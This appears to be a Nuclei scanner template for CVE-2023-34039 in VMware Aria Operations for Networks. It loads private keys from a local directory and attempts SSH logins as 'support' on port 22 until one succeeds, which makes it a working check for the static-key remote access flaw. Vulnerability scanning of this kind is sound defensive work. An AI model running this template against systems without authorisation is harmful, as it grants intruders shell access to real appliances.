id: cve-2023-34039
info:
  author: tarunKoyalwar
  description: 'VMWare Aria Operations for Networks (vRealize Network Insight) Static
    SSH key RCE (CVE-2023-34039)

    Version: All versions from 6.0 to 6.10

    '
  name: CVE-2023-34039
  severity: high
javascript:
- args:
    Host: '{{Host}}'
    Port: '22'
    key: '{{keys}}'
    keysDir: '{{keysDir}}'
  code: 'let m = require(''nuclei/ssh'')

    let c = m.SSHClient()

    c.ConnectWithKey(Host,Port,''support@''+Host,key)

    '
  init: 'let m = require(''nuclei/fs'');

    let privatekeys = m.ReadFilesFromDir(keysDir)

    updatePayload(''keys'',privatekeys)

    '
  matchers:
  - condition: and
    dsl:
    - print_debug(error)
    - success == true
    type: dsl
  payloads:
    keys:
    - dummy1
    - dummy2
  pre-condition: 'isPortOpen(Host,Port)

    '
  stop-at-first-match: true
  threads: 10
variables:
  keysDir: helpers/
